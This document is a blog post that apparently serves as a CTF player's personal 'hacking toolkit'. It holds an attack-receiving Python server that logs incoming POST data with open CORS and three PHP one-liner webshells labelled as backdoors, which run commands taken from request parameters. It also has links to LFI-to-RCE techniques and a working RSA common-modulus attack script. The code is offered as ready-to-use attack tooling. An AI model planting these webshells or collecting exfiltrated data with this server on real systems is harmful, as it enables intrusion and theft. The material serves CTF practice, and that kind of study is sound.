---
abbrlink: 4e56d65
categories:
    - - Hacking
cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/9/Blog_cover%20(17)%20(1)_3e1f0c91c61253af1f2670f4341e7d33.jpg
date: "2024-09-03T23:50:41.047232+08:00"
sticky: 1337
tags: CTF
title: My Hacking Toolkit
updated: "2024-09-04T16:33:10.514+08:00"
---

# Web

## Temp Server (Python)

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

## One-liner Trojan (Backdoor, Webshell)

```php
<?php @eval($_POST['shell']);?>
<?php @system($_POST["cmd"])?>
<?php passthru($_GET['cmd']); ?>
```

## LFI & RFI

### LFI2RCE

-   [Advanced Local File Inclusion to RCE in 2022](https://blog.stevenyu.tw/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/)
-   [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/CX330Blake/PHP_INCLUDE_TO_SHELL_CHAR_DICT)

# Crypto

## Common Modulus Attack

```python
from Crypto.Util.number import long_to_bytes

n = 8043524339665486501722690364841854181558012095441297536641336786057021881436981279151373985115124256457664918399612791182378270114245970486016546496099141
e1 = 863047
c1 = 977794351462943753500623403456170325029164798178157637276767524847451843872628142596652557213651039320937257524442343930998122764638359874102209638080782
e2 = 995023
c2 = 7803335784329682230086969003344860669091120072205053582211253806085013270674227310898253029435120218230585288142781999838242977459669454181592089356383378


def egcd(a: int, b: int) -> tuple[int, int, int]:
    if a == 0:
        return (b, 0, 1)
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)


def inverse(a: int, b: int) -> int:
    g, x, y = egcd(a, b)  # ax + by = g
    if g == 1:
        return x % b
    raise ValueError("base is not invertible for the given modulus.")


g, x, y = egcd(e1, e2)

if x < 0:
    c1_inv = inverse(c1, n)
    c1 = pow(c1_inv, -x, n)
else:
    c1 = pow(c1, x, n)

if y < 0:
    c2_inv = inverse(c2, n)
    c2 = pow(c2_inv, -y, n)
else:
    c2 = pow(c2, y, n)

m = (c1 * c2) % n
print(long_to_bytes(m))
```

## Hash Collision

-   [Hash Collisions](https://github.com/CX330Blake/Hash-Collisions/)
